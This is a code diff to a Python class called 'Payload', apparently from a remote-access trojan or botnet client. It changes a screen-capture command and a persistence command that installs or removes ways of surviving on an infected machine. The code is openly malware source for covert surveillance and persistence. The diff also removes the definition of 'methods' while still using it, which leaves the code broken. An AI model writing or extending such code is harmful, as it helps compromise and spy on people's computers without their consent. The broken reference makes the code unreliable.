@@ -876,11 +876,6 @@ class Payload():
         
         """
         try:
-#            if 'mss' not in globals():
-#                self.load('mss')
-#            with mss.mss() as screen:
-#                img = screen.grab(screen.monitors[0])
-#            return globals()['png'](img)
             if 'screenshot' not in globals():
                 self.load('screenshot')
             return globals()['screenshot'].run()
@@ -910,13 +905,12 @@ class Payload():
         try:
             if not 'persistence' in globals():
                 self.load('persistence')
-            methods = globals()['persistence'].methods() + ['all']
             cmd, _, action = str(args).partition(' ')
-            if cmd not in ('add','remove') or action not in methods:
+            if cmd not in ('add','remove'):
                 return self.persistence.usage + str('\nmethods: %s' % ', '.join(methods))
-            for method in methods:
+            for method in globals()['persistence']._methods:
                 if action == 'all' or action == method:
-                    getattr(globals()['persistence'].methods[method], cmd)()
+                    getattr(globals()['persistence']._methods[method], cmd)()
             return json.dumps(persistence.results())
         except Exception as e:
             log("{} error: {}".format(self.persistence.func_name, str(e)))
